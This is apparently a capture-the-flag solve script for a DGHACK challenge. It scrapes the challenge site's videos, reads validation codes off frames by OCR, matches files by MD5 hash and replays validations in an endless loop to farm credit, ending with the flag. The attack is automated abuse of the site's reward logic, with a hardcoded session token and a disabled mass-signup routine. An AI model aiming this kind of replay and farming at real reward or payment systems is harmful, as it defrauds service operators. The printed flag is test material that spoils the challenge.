import os
import cv2
import sys
import json
import random
import requests
import numpy as np
from time import sleep
from hashlib import md5
from threading import Timer
from bs4 import BeautifulSoup
from pytesseract import pytesseract

HOST = "http://infinitemoneyglitch.chall.malicecyber.com"

validated = 0
codes = []

proxies = { 'http': 'http://localhost:8080' }
#proxies = None

"""
def signup():
    id = random.randint(1, 100)
    user = 'thesee' + str(id)
    session = requests.session()
    data = { 'email':            user + '@home.fr',
             'username':         user,
             'firstname':        user,
             'lastname':         user,
             'password':         'password',
             'confirm_password': 'password',
             'submit':           'Sign In'
             }
    r = session.post(HOST + "/signup", data=data, proxies=proxies, allow_redirects=True)
    if r.status_code == 200:
        print('Signup successful', user)
        cookies = session.cookies
        for cookie in cookies:
            if cookie.name == 'token':
                token = cookie.value
                print('token', token)
                return session, user, token
    else:
        print('Signup failed', user, r.status_code)
        print(r.text)
    return 0

def login(session, user):
    data = { 'email':            user + '@home.fr',
             'password':         'password',
             'submit':           'Log In'
             }
    r = session.post(HOST + "/login", data=data, proxies=proxies, allow_redirects=True)
    if r.status_code == 200:
        print('Login successful', user)
        cookies = session.cookies
        for cookie in cookies:
            if cookie.name == 'token':
                token = cookie.value
                print('token', token)
                return token
    else:
        print('Login failed', user, r.status_code)
        print(r.text)
    return 0
"""

def get_stream(r):
    soup = BeautifulSoup(r.content, "html.parser")
    # Get video stream
    videos = soup.find_all("video")
    for video in videos:
        #import pdb; pdb.set_trace()
        stream = video.encode().split()[4][13:-1].decode()
    return stream

def video(session, token):
    cookies = { 'token': token }
    r = session.get(HOST + "/video", cookies=cookies, proxies=proxies)
    if r.status_code == 200:
        if '/stream/' in r.text:
            stream = get_stream(r)
            return stream
        else:
            print('no video stream')
            print(r.text)
    else:
        print('get video error', int(r.status_code))
        print(r.text)
    return 0

def validate(session, token, stream, code):
    global validated
    cookies = { 'token': token }
    json = { 'uuid': stream, 'code': str(code) }
    r = session.post(HOST + "/validate", cookies=cookies, json=json, proxies=proxies)
    if r.status_code == 200:
        if 'Video validated' in r.text:
            validated += 1
            print(stream, 'validated', '(', str(validated), ')')
            return True
        else:
            print(stream, 'not validated')
            print(r.text)
    else:
        print(stream, 'validation error', int(r.status_code))
        print(r.text)
    return False

def download(session, token, stream):
    cookies = { 'token': token }
    r = session.get(HOST + "/stream/" + stream, cookies=cookies, proxies=proxies, stream=True)
    if r.status_code == 200:
        # Save stream file
        stream_file = stream + ".mp4"
        with open(stream_file, 'wb') as f:
            f.write(r.content)
        print(stream, 'downloaded')
        return stream_file
    else:
        print(stream, 'download error', int(r.status_code))
        return ""

def preprocess(image):
    # RGB to Gray scale conversion
    img = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)
    # Noise removal with iterative bilateral filter
    img = cv2.bilateralFilter(img, 11, 17, 17)
    # thresholding the grayscale image
    img = cv2.threshold(img, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)[1]
    return img

def extract(stream_file):
    code = 0
    vidcap = cv2.VideoCapture(stream_file, cv2.CAP_ANY)
    # Get some frame sample (text is not placed at the same timing)
    # Look at 15s, 20s first
    # Look at 10s, 25s next if no code found...
    # Look at 1s, 5s, 8s, 12s, 17s, 22s, 27s if still no code found...
    for time in [15, 20, 10, 25, 1, 3, 5, 8, 12, 17, 22, 24, 27]:
        vidcap.set(cv2.CAP_PROP_POS_MSEC,time*1000)
        success, image = vidcap.read()
        if success:
            # Preprocess image for easier text extraction
            # Then use tesseract to extract text: "Validation code: <code>"
            #cv2.imwrite('frame' + str(time) + 'sec.jpg', image)
            preprocessed = preprocess(image)
            #cv2.imwrite('frame' + str(time) + 'sec_prep.jpg', preprocessed)
            text = pytesseract.image_to_string(preprocessed, lang="eng", config='--psm 6')
            if "code" in text:
                s = text.split("code: ")
                if len(s) > 1:
                    if len(s[1]) >= 4:
                        candidate = s[1][:4]
                        if candidate.isdigit():
                            code = int(candidate)
                            hash = md5sum(stream_file)
                            entry = {'hash': hash, 'code': code}
                            codes.append(entry)
                            print(entry)
                            break
    vidcap.release()
    return code

def schedule_validation(session, token, stream, code):
    timer = Timer(20, validate, [session, token, stream, code])
    timer.start()

def md5sum(stream_file):
    with open(stream_file, "rb") as f:
        hash = md5(f.read()).hexdigest()
    return hash

def next(session, token, hash_code_list):
    stream = video(session, token)
    stream_file = download(session, token, stream)
    hash = md5sum(stream_file)
    for hash_code in hash_code_list:
        if hash_code['hash'] == hash:
            code = hash_code['code']
            schedule_validation(session, token, stream, code)

def download_many(session, token, nb):
    for _ in range(nb):
        stream = video(session, token)
        stream_file = download(session, token, stream)

def main():
    session = requests.session()
    # Sign up on the website and grab cookie 'token' there
    token = "9184be98-a720-4c73-a3c6-4962aa0386fe"
    cmd = sys.argv[1]
    if cmd == 'DOWNLOAD':
        download_many(session, token, 2000)
    elif cmd == 'EXTRACT':
        stream_file = sys.argv[2]
        extract(stream_file)
    elif cmd == 'VALIDATE':
        with open('hash_code.json') as f:
            hash_code_list = json.load(f)
        while(1):
            # Infinite loop
            # Buy card and get flag directly on the website when enough money...
            next(session, token, hash_code_list)

main()

# DGHACK{ButWhereCanIActuallySpendIt}
